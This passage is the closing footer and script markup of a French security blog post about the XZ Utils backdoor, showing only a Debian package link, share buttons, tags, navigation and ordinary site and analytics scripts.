<li><a href="https://snapshot.debian.org/package/xz-utils/5.6.1-1/" target="_blank" rel="noopener noreffer ">https://snapshot.debian.org/package/xz-utils/5.6.1-1/</a></li>
</ul>
</div><div class="post-footer" id="post-footer">
    <div class="post-info">
        <div class="post-info-line">
            <div class="post-info-mod">
                <span>Mis à jour le 01/04/2024</span>
            </div></div>
        <div class="post-info-line">
            <div class="post-info-md"><span>
                            <a class="link-to-markdown" href="/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/index.md" target="_blank">Lire Markdown</a>
                        </span></div>
            <div class="post-info-share">
                <span><a href="javascript:void(0);" title="Partager sur Twitter" data-sharer="twitter" data-url="http://localhost:1313/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/" data-title="XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité" data-via="trackflaw" data-hashtags="Test d&#39;intrusion,Pentest,Audit"><i class="fab fa-twitter fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Facebook" data-sharer="facebook" data-url="http://localhost:1313/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/" data-hashtag="Test d&#39;intrusion"><i class="fab fa-facebook-square fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Hacker News" data-sharer="hackernews" data-url="http://localhost:1313/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/" data-title="XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité"><i class="fab fa-hacker-news fa-fw" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur Line" data-sharer="line" data-url="http://localhost:1313/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/" data-title="XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité"><i data-svg-src="/lib/simple-icons/icons/line.min.svg" aria-hidden="true"></i></a><a href="javascript:void(0);" title="Partager sur 微博" data-sharer="weibo" data-url="http://localhost:1313/xz-utils--la-backdoor-faisant-trembler-le-monde-libre/" data-title="XZ Utils : la backdoor faisant trembler le monde libre et de la cybersécurité" data-image="/images/xz-utils-:-la-backdoor-faisant-trembler-le-monde-libre/logo.png"><i class="fab fa-weibo fa-fw" aria-hidden="true"></i></a></span>
            </div>
        </div>
    </div>

    <div class="post-info-more">
        <section class="post-tags"><i class="fas fa-tags fa-fw" aria-hidden="true"></i>&nbsp;<a href=""></a>,&nbsp;<a href="/tags/pentest/">Pentest</a>,&nbsp;<a href="/tags/audit/">Audit</a></section>
        <section>
            <span><a href="javascript:void(0);" onclick="window.history.back();">Retour</a></span>&nbsp;|&nbsp;<span><a href="/">Accueil</a></span>
        </section>
    </div>

    <div class="post-nav"><a href="/pourquoi-faire-un-test-intrusion-sur-son-site-wordpress/" class="prev" rel="prev" title="Pourquoi faire un test d&#39;intrusion sur son site Wordpress en 2024 ?"><i class="fas fa-angle-left fa-fw" aria-hidden="true"></i>Pourquoi faire un test d'intrusion sur son site Wordpress en 2024 ?</a></div>
</div>
</article></div>
            </main><footer class="footer">
        <div class="footer-container"><div class="footer-line">Trackflaw</div><div class="footer-line" itemscope itemtype="http://schema.org/CreativeWork"></div>
        </div>
    </footer></div>

        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="Remonter en haut">
                <i class="fas fa-arrow-up fa-fw" aria-hidden="true"></i>
            </a><a href="#" id="view-comments" class="fixed-button" title="Afficher les commentaires">
                <i class="fas fa-comment fa-fw" aria-hidden="true"></i>
            </a>
        </div><link rel="stylesheet" href="/lib/katex/katex.min.css"><link rel="stylesheet" href="/lib/cookieconsent/cookieconsent.min.css"><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.stemmer.support.min.js"></script><script type="text/javascript" src="/lib/lunr/lunr.fr.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript" src="/lib/katex/katex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/auto-render.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/copy-tex.min.js"></script><script type="text/javascript" src="/lib/katex/contrib/mhchem.min.js"></script><script type="text/javascript" src="/lib/cookieconsent/cookieconsent.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"Copier dans le presse-papiers","maxShownLines":50},"comment":{},"cookieconsent":{"content":{"dismiss":"Ok !","link":"En savoir plus","message":"Trackflaw utilise des cookies pour améliorer votre expérience et effectuer des statistiques."},"enable":true,"palette":{"button":{"background":"#f0f0f0"},"popup":{"background":"#1aa3ff"}},"theme":"edgeless"},"math":{"delimiters":[{"display":true,"left":"$$","right":"$$"},{"display":true,"left":"\\[","right":"\\]"},{"display":true,"left":"\\begin{equation}","right":"\\end{equation}"},{"display":true,"left":"\\begin{equation*}","right":"\\end{equation*}"},{"display":true,"left":"\\begin{align}","right":"\\end{align}"},{"display":true,"left":"\\begin{align*}","right":"\\end{align*}"},{"display":true,"left":"\\begin{alignat}","right":"\\end{alignat}"},{"display":true,"left":"\\begin{alignat*}","right":"\\end{alignat*}"},{"display":true,"left":"\\begin{gather}","right":"\\end{gather}"},{"display":true,"left":"\\begin{CD}","right":"\\end{CD}"},{"display":false,"left":"$","right":"$"},{"display":false,"left":"\\(","right":"\\)"}],"strict":false},"search":{"highlightTag":"em","lunrIndexURL":"/index.json","lunrLanguageCode":"fr","maxResultLength":10,"noResultsFound":"Aucun résultat trouvé","snippetLength":30,"type":"lunr"}};</script><script type="text/javascript" src="/js/theme.min.js"></script>
<script async src="https://www.googletagmanager.com/gtag/js?id=G-TRE4WGVY4F"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'G-TRE4WGVY4F');
</script></body>
</html>
